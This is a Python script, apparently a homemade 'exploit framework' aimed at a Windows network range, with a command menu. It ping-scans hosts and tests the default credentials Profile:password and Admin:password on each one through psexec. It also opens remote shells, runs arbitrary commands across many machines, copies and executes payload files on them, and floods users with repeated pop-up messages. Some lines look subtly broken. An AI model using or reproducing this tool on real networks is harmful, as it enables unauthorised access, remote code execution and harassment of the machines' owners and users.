# Everything you want in one place

import os
import time
import threading

screenlock = threading.Semaphore(value=1)

PATH_TO_PAYLOADS = r"C:\Users\Admin\Documents\Code"


banner = '''
  /$$$$$$  /$$$$$$$$ /$$$$$$$$
 /$$__  $$| $$_____/| $$_____/
| $$  \__/| $$      | $$
| $$      | $$$$$   | $$$$$
| $$      | $$__/   | $$__/
| $$    $$| $$      | $$
|  $$$$$$/| $$$$$$$$| $$
 \______/ |________/|__/
                          '''
validCommands = ["scan", "scannames", "credtest", "getcmd", "rexec", "rcpy", "msg", "include", "exclude"]
validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" ,"Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Remove an IP from the protected list", "Add an IP to the predicted list"]

ips = []
defaultCredIps = []
exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]

completeFlags = []


def menu():
    for line in banner:
        print(line, end="")
    print("\nRun 'scan' to find all IPs, then 'credtest' to see which of those have default creds")

    while True:
        cmd = input("\n> ").split(" ")

        if cmd[0] == "help":
            print("\n[!] Available commands are:\n")
            for i in range(0, len(validCommands)):
                print("[+] " + validCommands[i] + " :: " + validDesc[i])

        if cmd[0] == "getcmd":
            rconnect()

        if cmd[0] == "msg":
            rmsg()

        if cmd[0] == "clear":
            os.system("cls")
            for line in banner:
                print(line, end="")
            print("\nCYBERFIRST EXPLOIT FRAMEWORK v0.2")

        if cmd[0] == "rexec":
            if len(cmd) > 1:
                if cmd[1] == "default":
                    rexec(defaultMode=True)
            else:
                rexec()

        if cmd[0] == "rcpy":
            if len(cmd) > 1:
                if cmd[1] == "default":
                    rcpy(defaultMode=True)
            else:
                rcpy()

        if cmd[0] == "scan":
            rscan()

        if cmd[0] == "scannames":
            rscannames()

        if cmd[0] == "hosts":
            print("\n[+] TARGETS " + str(ips).replace(" ", ""))
            print("[+] DEFAULT " + str(defaultCredIps).replace(" ", ""))
            # print("[+] EXCLUDE " + str(exclude).replace(" ", ""))

        if cmd[0] == "credtest":
            credTest()

        if cmd[0] == "exclude":
            if int(cmd[1]) not in exclude:
                exclude.append(int(cmd[1]))

        if cmd[0] == "include":
            if int(cmd[1]) in exclude:
                exclude.remove(int(cmd[1]))

        if cmd[0] == "resolve":
            resolveDefaults()


def resolveDefaults():
    for host in defaultCredIps:
        print("10.181.231.%s :: " % str(host), end=" ")
        rexecT(host, "Admin", "password", "hostname")


def rconnect():
    target = input("\n[RHOST]> ")
    uname = input("[UNAME]> ")
    pword = input("[PWORD]> ")
    print("\n[+] Spawning shell\n")
    os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword)) #CHANGE TO WHEREVER PSEXEC IS


def credTest():
    global completeFlags
    global defaultCredIps
    completeFlags = []
    index = 0
    for i in ips:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i,"Profile", "password", "hostname", index, True))
        x.start()
        index += 1
    while 0 in completeFlags:
        pass
    defaultCredIps.sort()
    os.system("cls")
    print("\n[+] Found %s devices with default credentials of Profile:password" % str(len(defaultCredIps)))
    print("[+] " + str(defaultCredIps).replace(" ", ""))


def rexec(defaultMode=False, copyExe=False):
    global completeFlags
    global outputs
    completeFlags = []

    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    if not defaultMode:
        uname = input("[UNAME]> ")
        pword = input("[PWORD]> ")
        cmnd = input("[COMND]> ")
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rexecT, args=(i,uname, pword, cmnd, index))
                x.start()
                time.sleep(.1)
                index += 1
        while 0 in completeFlags:
            pass
    else:
        cmnd = input("[COMND]> ")
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in defaultCredIps and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rexecT, args=(i,"Admin", "password", cmnd, index))
                x.start()
                time.sleep(.1)
                index += 1
        while 0 in completeFlags:
            pass
    print("\n[+] Done")


def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False): # The actual function for executing a command so that it can be threaded
    global completeFlags
    global defaultCredIps
    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
    resp = os.system(psexecString)
    if sav and tgt not in defaultCredIps:
        if str(resp) == "0":
            defaultCredIps.append(ending)
    completeFlags[index] = 1


def rcpy(defaultMode=False):
    global completeFlags
    completeFlags = []
    interactive = input("[!] Specify if you want this to run visibly on the desktop with y/n\n[SCREEN]> ")
    if interactive.lower() == "y":
        interactive = True
        print("[+] Interactive is on")
    else:
        interactive = False
    fname = input("[FILE ]> ")
    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    if defaultMode == False:
        uname = input("[UNAME]> ")
        pword = input("[PWORD]> ")

        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rcpyT, args=(i,uname, pword, fname, index, interactive))
                x.start()
                index += 1
        while 0 in completeFlags:
            pass
    else:
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rcpyT, args=(i,"Profile", "password", fname, index, interactive))
                x.start()
                index += 1
        while 0 in completeFlags:
            pass
    print("\n[+] Done")


def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): # The actual function for executing a command so that it can be threaded
    global completeFlags
    global defaultCredIps
    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = ""
    if onDesktop == False:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c %s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    else:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c "%s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    resp = os.system(psexecString)
    completeFlags[index] = 1


def rscan():  # Conducts a ping scan to discover any hosts on the network
    global ips
    ips = []
    for i in range(100, 240):
        ip = "10.181.231." + str(i)
        if os.system("ping -n 1 -w 100 " + ip) == 0:
            ips.append(i)
    os.system("cls")
    print("\n==================================================")
    print("\n[+] PRESCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(ips)))
    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
    print("\n==================================================\n")


def rscannames():  # Conducts a scan of the netbios names to discover any hosts on the network
    global ips
    ips = []
    for name in range(63):
        ips.append(os.system(r"C:\Users\Admin\nbtscan-1.0.35.exe " + "\"" + str(name) + "\""))
    os.system("cls")
    print("\n==================================================")
    print("\n[+] PRESCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(ips)))
    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
    print("\n==================================================\n")


def rmsg():
    maxThreads = 64
    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    reason = input("[MESSG]> ")
    num = int(input("[NUMBR]> "))
    print("")
    for t in range(0, num):
        for i in range(iprangeMin, iprangeMax):
            if i in ips:
                target = "10.181.231." + str(i)
                x = threading.Thread(target=rmsgT, args=(reason,target))
                x.start()


def rmsgT(reason="", target=""):
    print("[+] MESSAGING:", target)
    os.system(r'msg Admin /SERVER %s %s' % (target, reason))


menu()
